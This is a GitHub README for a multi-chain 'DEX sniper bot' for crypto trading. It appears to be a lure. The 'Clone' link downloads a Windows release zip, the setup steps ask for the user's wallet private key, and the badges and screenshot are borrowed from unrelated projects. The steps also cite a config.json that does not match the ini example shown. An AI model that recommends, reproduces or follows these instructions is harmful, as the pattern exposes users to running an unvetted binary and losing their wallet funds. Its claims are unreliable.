# dex-sniper-bot

<p align="center">
  <a href="https://www.npmjs.com/package/hashlips_art_engine">
    <img alt="downloads" src="https://img.shields.io/npm/dm/hashlips_art_engine.svg?color=blue" target="_blank" />
  </a>
  <a href="https://github.com/deadspyexx/dex-sniper-bot/blob/main/LICENSE">
    <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-yellow.svg" target="_blank" />
  </a>
  <a href="https://codecov.io/gh/kefranabg/readme-md-generator">
    <img src="https://codecov.io/gh/kefranabg/readme-md-generator/branch/master/graph/badge.svg" />
  </a>
  <a href="">
    <img src="https://img.shields.io/badge/changelog-gitmoji-brightgreen.svg" alt="gitmoji-changelog">
  </a>
</p>

A sniper bot is a type of automated trading bot that is programmed to make trades based on specific market conditions in the cryptocurrency industry. The name "sniper" comes from the bot's ability to make fast and precise trades, entering and exiting positions quickly.

To identify profitable trades, sniper bots use technical analysis and various indicators, such as price changes, trading volume, and market trends. Once the bot detects a favorable trade, it will automatically execute a buy or sell order based on specific parameters, such as target prices or stop-loss limits.

# Sniper bot for multiple decentralized exchanges (DEX)

![Mempool sniper bot interface](https://github.com/deadspyexx/Mempool-sniper-bot/blob/main/menu_screen.png?raw=true)

* Arbswap (Arbitrum)
* Uniswap (Optimism)
* BaseSwap (Base)
* zkSwap Finance (ZkSync)
* Pancakeswap (Binance Smart Chain)
* Uniswap (Ethereum)
* Sushiswap (Polygon)
* Quickswap (Polygon)
* Trader Joe (Avalanche)

## Requirements
- Windows 7/10/11
- [Node.js](https://nodejs.org/en/download/prebuilt-installer)
## Installing
- [Clone](https://github.com/deadspyexx/dex-sniper-bot/releases/download/Release/dex-sniper-bot-1.3.2.zip) repository and extract files.
- Edit the address and private_key fields in the config.json file. 
- Set up the network and AMMs in the sniping menu. Ensure that there are sufficient funds on the specified address to cover transaction fees.

## Configuration

```ini
[WALLET]
; This is your BSC wallet's private key.
SECRET_KEY=private_wallet_key

; A private node is recommended for better uptime. However, you may also use free nodes.
WSS_NODE=wss://bsc-ws-node.nariox.org:443


[CONTRACTS]
; These variables support some pre-defined contracts (BNB, ETH, BUSD). 
; For other contracts, you'll have to specify the contract address yourself.
INPUT=BNB
OUTPUT=BUSD


[TRANSACTION]

GAS_LIMIT=500000
GAS_PRICE=5

; This variable is the amount of cryptocurrency you wish to use with the input contract.
; For example, if you use WBNB as input, you will specify the amount in WBNB's format.
AMOUNT_IN=0.0033

BUY_SLIPPAGE=10
```

